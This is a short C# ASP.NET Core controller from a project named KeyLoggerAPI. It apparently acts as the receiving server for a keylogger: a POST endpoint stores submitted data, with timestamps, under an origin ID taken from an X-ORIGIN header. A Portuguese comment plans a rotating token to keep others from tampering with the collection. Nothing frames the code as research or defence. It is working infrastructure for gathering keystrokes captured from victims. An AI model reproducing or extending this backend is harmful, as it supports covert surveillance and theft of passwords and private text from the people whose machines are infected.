using KeyLoggerAPI.Entitys;
using KeyLoggerAPI.Repository;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Linq;
using System.Threading.Tasks;

namespace KeyLoggerAPI.Controllers
{
    [ApiController, Route("api")]
    public class KeyLoggerController : Controller
    {
        private readonly IKeyLoggerRepository _repository;

        public KeyLoggerController(IKeyLoggerRepository repository)
        {
            _repository = repository;
        }

        [HttpGet]
        public async Task<IActionResult> GetAsync()
        {
            try
            {

            }
            catch (Exception)
            {

            }

            return BadRequest();
        }

        [HttpPost]
        public async Task<IActionResult> PostAsync([FromBody] string data)
        {
            try
            {
                /*
                 Pensando ainda como vou fazer o esquema para identificar a origem...

                origem deve ser fixo pois é a identificacao de log na base de dados,
                mas deve ser combinado com um token que alterne a cada requisicao para caso alguem tente interceptar a requisicao mandando algo invalido

                 */
                if (Request.Headers.TryGetValue("X-ORIGIN", out Microsoft.Extensions.Primitives.StringValues value))
                {
                    var log = await _repository.GetLogByOriginAsync(value.FirstOrDefault());

                    if (log == null)
                    {
                        log = await _repository.AddLogAsync(value.FirstOrDefault());
                        log.RegisterLogs = new System.Collections.Generic.List<RegisterLog>();
                    }

                    log.RegisterLogs.Add(new RegisterLog
                    {
                        DateTime = DateTime.UtcNow,
                        Register = data
                    });

                    await _repository.UpdateLogAsync(log);

                    return Ok();
                }
            }
            catch (Exception)
            {

            }

            return BadRequest();
        }
    }
}
